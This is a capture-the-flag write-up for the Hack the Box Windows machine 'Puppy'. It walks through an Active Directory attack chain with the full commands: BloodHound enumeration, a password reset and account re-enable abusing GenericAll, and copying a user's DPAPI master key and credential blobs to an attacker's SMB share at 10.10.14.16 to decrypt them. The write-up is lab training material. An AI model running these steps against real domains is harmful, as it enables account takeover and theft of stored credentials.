Puppy is a medium machine from Hack the Box. As common in Windows pentests we start out with a set of credentials.


```text
levi.james / KingofAkron2025!
````
## Bloodhound

Using these creds, we can run a BloodHound to get a lay of the land and what privs we have in the domain.

```bash
bloodhound-python \
  -d puppy.htb \
  -dc puppy.htb \
  -ns 10.10.11.70 --dns-tcp \
  -u levi.james@puppy.htb \
  -p 'KingofAkron2025!' \
  -c All
```

## ACL Abuse 

ant.edwards is a member of senior devs

![ant.edwards senior devs](/assets/img/Puppy/3.png)

![senior devs GenericAll over adam.silver](/assets/img/Puppy/4.png)

and members of senior devs have generic all over adam.silver.

So let's change his password

```bash
net rpc password adam.silver 'Password123' -U 'puppy.htb\ant.edwards%Antman2025!' -S puppy.htb
```

Now his creds are valid, however, adam.silver account is disabled

```text
nxc smb puppy.htb -u 'adam.silver' -p 'Password123' 
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:Password123 STATUS_ACCOUNT_DISABLED
```

If we do an ldap search for adam.silver, we can see that the user account control is userAccountControl: 66050

```bash
ldapsearch -x -H ldap://10.10.11.70 -D "ANT.EDWARDS@PUPPY.HTB" -W -b "DC=puppy,DC=htb" "(sAMAccountName=ADAM.SILVER)"
```

Using a UAC decoder, we can paste the UAC in and see the appropriate flags

![UAC decoder](/assets/img/Puppy/5.png)

if we look at the UAC values on the Microsoft website, we see the value of accounts disabled, it is 2

![UAC ACCOUNTDISABLE = 2](/assets/img/Puppy/6.png)

So if we minus 2 UAC points off adam.silver - since we have generic, all we can do is this, we should enable his account

If we make a file with this info and then run ldap modify, we can enable his account

```text
cat entry 
dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
changetype: modify
replace: userAccountControl
userAccountControl: 66048
```

```bash
ldapmodify -x -H ldap://puppy.htb -D "ant.edwards@puppy.htb" -w 'Antman2025!' -f entry
```

Now it's enabled

```text
nxc smb puppy.htb -u 'adam.silver' -p 'Password123'
```

## DPAPI Blob

Steph's Credentials folder contains dpapi blob. This suggests that Steph has credentials saved in the browser

If we look under dir -h C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\ we can see it contains a blob

In Windows, a blob = Binary Large Object. It’s just a file that contains encrypted data — not readable text.

There are two types of blobs,

* 1. a credential blob, which holds saved credentials. These blobs are encrypted with DPAPI using the user's master key

     * DPAPI is just a built-in crypto service that encrypts secrets. each user has a DPAPI master key
* 2. master key blobs - stored in

     * C:\Users<user>\AppData\Roaming\Microsoft\Protect<SID>{GUID}
     * It's encrypted itself using the user's logon credentials and its used to decryped credential blobs

as we can see steph.cooper has a blob

```powershell
*Evil-WinRM* PS C:\Users\steph.cooper\Desktop> dir -h C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\

    Directory: C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   8:14 AM          11068 DFBE70A7E5CC19A398EBF1B96859CE5D
```

We can use the tool SharpDPAPI to decrypt the blob using our master key

```text
Evil-WinRM* PS C:\Users\steph.cooper\Documents> .\SharpDPAPI.exe credentials
```

However, there is no master key in our users’ cache, so we have to manually extract the master key and decrypt it

inorder to get our master key, we need first our SID

```powershell
*Evil-WinRM* PS C:\Users\steph.cooper\Desktop> whoami /user

USER INFORMATION
----------------

User Name          SID
================== ==============================================
puppy\steph.cooper S-1-5-21-1487982659-1829050783-2281216199-1107
```

Once we have our SID, we can go to **C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107**

```powershell
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> dir -h

    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:40 AM            740 556a2412-1275-4ccf-b721-e6a0b4f90407
-a-hs-         2/23/2025   2:36 PM             24 Preferred
```

As we can see, the master key is there

We need to copy the file to our home folder to download it

```powershell
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> Copy-Item "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407" C:\Users\steph.cooper\masterkey_blob
```

Now we set up an smb share on our host

```bash
impacket-smbserver share . -smb2support
```

and transfer it over

```powershell
Copy-Item C:\Users\steph.cooper\masterkey_blob \\10.10.14.16\share\masterkey_blob
```

Using the tool impacket-dpapi masterkey, we can decrypt the masterkey blob

```bash
impacket-dpapi masterkey -file masterkey_blob \
  -sid S-1-5-21-1487982659-1829050783-2281216199-1107 \
  -password 'ChefSteph2025!'
```

Since we have the master key, we can transfer over the credential blob using the same method as before.

```powershell
Copy-Item "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9" "\\10.10.14.16\share\credential_blob"
```

Now we can decrypt the blob and get the stored credentials

```bash
impacket-dpapi credential -file credential_blob -key  0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```
